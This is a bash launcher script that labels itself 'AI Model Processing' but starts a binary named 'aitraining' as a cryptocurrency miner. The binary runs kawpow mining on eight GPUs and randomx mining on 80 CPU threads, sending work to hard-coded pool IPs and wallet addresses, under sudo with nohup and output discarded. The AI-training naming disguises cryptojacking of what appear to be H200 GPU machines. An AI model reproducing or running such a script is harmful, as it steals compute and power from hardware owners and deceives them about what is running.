#!/bin/bash

# --- STOP OLD PROCESSES ---
sudo pkill -f aitraining 2>/dev/null
sudo pkill -f monitor_system 2>/dev/null
sleep 2

mkdir -p ./logs

echo "=== Starting AI Model Processing ==="

# --- GPU PROCESS ---
nohup sudo ./aitraining \
    --algorithm kawpow \
    --pool 51.89.99.172:16161 \
    --wallet RM2ciYa3CRqyreRsf25omrB4e1S95waALr \
    --worker H200-rig \
    --password x \
    --gpu-id 0,1,2,3,4,5,6,7 \
    --tls true \
    --disable-cpu \
    --log-file ./logs/gpu_processing.log \
    --log-file-mode 1 \
    --api-enable \
    --api-port 21550 \
    --api-rig-name H200-GPU > /dev/null 2>&1 &

# --- CPU PROCESS ---
nohup sudo ./aitraining \
    --algorithm randomx \
    --pool 51.222.200.133:10343 \
    --wallet 44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd \
    --worker H200-cpu \
    --password x \
    --cpu-threads 80 \
    --disable-gpu \
    --tls true \
    --log-file ./logs/cpu_processing.log \
    --log-file-mode 1 \
    --api-enable \
    --api-port 21551 \
    --api-rig-name H200-CPU > /dev/null 2>&1 &

# --- MONITOR SYSTEM ---
nohup bash -c 'while true; do
    echo -e "\n=== $(date) System Status ===" >> ./logs/monitor.log
    echo "Active Processes:" >> ./logs/monitor.log
    ps aux | grep aitraining | grep -v grep >> ./logs/monitor.log
    echo "GPU Status:" >> ./logs/monitor.log
    nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> ./logs/monitor.log 2>/dev/null
    echo "---" >> ./logs/monitor.log
    sleep 30
done' > /dev/null 2>&1 &

echo "=== Processing Started Successfully ==="
echo ""
echo "📊 Log Files:"
echo "   GPU: ./logs/gpu_processing.log"
echo "   CPU: ./logs/cpu_processing.log"
echo "   Monitor: ./logs/monitor.log"
echo ""
echo "🌐 API Endpoints:"
echo "   GPU Stats: http://127.0.0.1:21550/stats"
echo "   CPU Stats: http://127.0.0.1:21551/stats"
echo ""
echo "🔍 Check processes: ps aux | grep aitraining"
echo "📈 Real-time logs: tail -f ./logs/*.log"
echo "🛑 Stop processing: sudo pkill -f aitraining && sudo pkill -f monitor_system"
